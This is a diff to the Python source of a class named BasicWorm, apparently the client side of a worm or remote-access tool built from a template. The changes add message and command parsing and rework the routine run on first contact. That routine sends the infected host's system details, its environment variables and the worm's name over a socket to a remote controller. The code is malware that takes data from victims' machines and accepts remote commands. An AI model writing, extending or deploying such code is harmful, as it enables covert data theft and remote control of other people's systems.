@@ -26,6 +26,7 @@ class BasicWorm(Process):
         self.sys_msg = "{{SYS_MSG}}"
         self.conn_pause = {{CONN_PAUSE}}
         self._sys_env = None
+        self.name = "Unknown"
     
     def _build_socket(self):
         try:
@@ -70,8 +71,8 @@ class BasicWorm(Process):
                 else:
                     return None
             
-            out_msg = base64.b64decode(msg.decode(self.format_code))
-            return out_msg
+            out_msg = base64.b64decode(msg)
+            return out_msg.decode(self.format_code)
         except:
             print("ERROR recv msg")
             return None
@@ -84,10 +85,28 @@ class BasicWorm(Process):
         except:
             return False
     
-    def send_sys_msg(self, type_msg, msg):
-        rmsg = self.sys_msg + type_msg + self.sys_msg + msg
+    def send_sys_msg(self, msg):
+        rmsg = msg.split(" ")
+        rmsg = self.sys_msg + self.sys_msg.join(rmsg) + self.sys_msg
         self.send_msg(rmsg)
-
+    
+    def unpack_headers(self, msg):
+        rmsg = msg.split(self.sys_msg)
+        cmd = []
+        for m in rmsg:
+            if m == "":
+                continue
+            cmd.append(m)
+        return cmd
+    
+    def unpack_command(self, msg):
+        cmd = []
+        msg = msg.split(" ")
+        for m in msg:
+            if m == "":
+                continue
+            cmd.append(m)
+        return cmd
     
     def get_sys_info(self):
         system = str(platform.system())
@@ -107,10 +126,11 @@ class BasicWorm(Process):
     
     def _first_action(self):
         sys_info = self.get_sys_info()
-        self.send_sys_msg("sys_info", sys_info)
+        self.send_msg(f"{self.sys_msg}sys_info{self.sys_msg}{sys_info}{self.sys_msg}")
         sleep(1)
-        self.send_sys_msg("sys_env", self.get_env_var())
+        self.send_msg(f"{self.sys_msg}sys_env{self.sys_msg}{self.get_env_var()}{self.sys_msg}")
         sleep(0.5)
+        self.send_msg(f"{self.sys_msg}worm_name{self.sys_msg}{self.name}{self.sys_msg}")
         
     
     def first_action(self):
